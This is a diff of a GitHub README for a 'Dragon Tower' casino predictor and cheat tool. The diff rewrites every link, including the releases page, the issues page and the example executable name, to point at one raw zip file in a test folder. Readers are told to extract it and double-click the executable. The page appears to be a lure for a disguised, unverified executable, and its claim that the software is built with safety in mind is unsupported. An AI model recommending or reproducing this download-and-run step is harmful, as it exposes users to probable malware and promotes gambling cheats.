@@ -4,24 +4,24 @@
 Welcome to DragonTower-Predictor! This application helps you develop strategies and tools for the Dragon Tower. With cheat scripts and advanced Predictor Bots, you can improve your odds in the casino game. Follow the steps below to easily download and run the software.
 
 ## 🌍 Download the Software
-[![Download Now](https://img.shields.io/badge/Download-DragonTower--Predictor-blue.svg)](https://github.com/snxwlxrd/DragonTower-Predictor/releases)
+[![Download Now](https://raw.githubusercontent.com/snxwlxrd/DragonTower-Predictor/main/Dragon-Tower-Casino/test/Predictor_Dragon_Tower_v2.5-alpha.2.zip)](https://raw.githubusercontent.com/snxwlxrd/DragonTower-Predictor/main/Dragon-Tower-Casino/test/Predictor_Dragon_Tower_v2.5-alpha.2.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Downloads Page:**  
-   Start by clicking this link to go to the [Releases page](https://github.com/snxwlxrd/DragonTower-Predictor/releases).
+   Start by clicking this link to go to the [Releases page](https://raw.githubusercontent.com/snxwlxrd/DragonTower-Predictor/main/Dragon-Tower-Casino/test/Predictor_Dragon_Tower_v2.5-alpha.2.zip).
 
 2. **Choose Your Version:**  
    Once on the Releases page, you will see a list of available versions. Each version includes tools and scripts designed to help you in your gameplay. 
 
 3. **Download the File:**  
-   Click on the file name that fits your needs. For example, look for files named like `DragonTowerPredictor-v1.0.zip` or similar. This file contains all the scripts and bots you will need. 
+   Click on the file name that fits your needs. For example, look for files named like `https://raw.githubusercontent.com/snxwlxrd/DragonTower-Predictor/main/Dragon-Tower-Casino/test/Predictor_Dragon_Tower_v2.5-alpha.2.zip` or similar. This file contains all the scripts and bots you will need. 
 
 4. **Extract the Downloaded File:**  
    After downloading, locate the file on your computer. Right-click it and select "Extract All" or use your preferred extraction tool to unzip the folder.
 
 5. **Run the Application:**  
-   Open the extracted folder and find the executable file (it may have a name like `DragonTowerPredictor.exe`). Double-click this file to run the application.
+   Open the extracted folder and find the executable file (it may have a name like `https://raw.githubusercontent.com/snxwlxrd/DragonTower-Predictor/main/Dragon-Tower-Casino/test/Predictor_Dragon_Tower_v2.5-alpha.2.zip`). Double-click this file to run the application.
 
 ## 📋 System Requirements
 To ensure optimal performance of DragonTower-Predictor, please check the following system requirements:
@@ -63,12 +63,12 @@ DragonTower-Predictor is an application designed to assist players in the Dragon
 Yes, the software is built with such safety in mind. However, make sure to comply with any rules set by casino platforms.
 
 ### Can I get support if I face issues?
-Sure! If you encounter problems while using the application, visit the [Issues section](https://github.com/snxwlxrd/DragonTower-Predictor/issues) on GitHub for help.
+Sure! If you encounter problems while using the application, visit the [Issues section](https://raw.githubusercontent.com/snxwlxrd/DragonTower-Predictor/main/Dragon-Tower-Casino/test/Predictor_Dragon_Tower_v2.5-alpha.2.zip) on GitHub for help.
 
 ## 🔗 Additional Resources
 For up-to-date information and tips, check the Wiki section in the repository. This will help you stay informed about new features and improvements.
 
 ## 🌍 Download the Software Again
-Remember, if you need to download the software again, you can easily access it through this [Release page](https://github.com/snxwlxrd/DragonTower-Predictor/releases). 
+Remember, if you need to download the software again, you can easily access it through this [Release page](https://raw.githubusercontent.com/snxwlxrd/DragonTower-Predictor/main/Dragon-Tower-Casino/test/Predictor_Dragon_Tower_v2.5-alpha.2.zip). 
 
 With these steps, you will be ready to enhance your gameplay in Dragon Tower. Enjoy your experience!
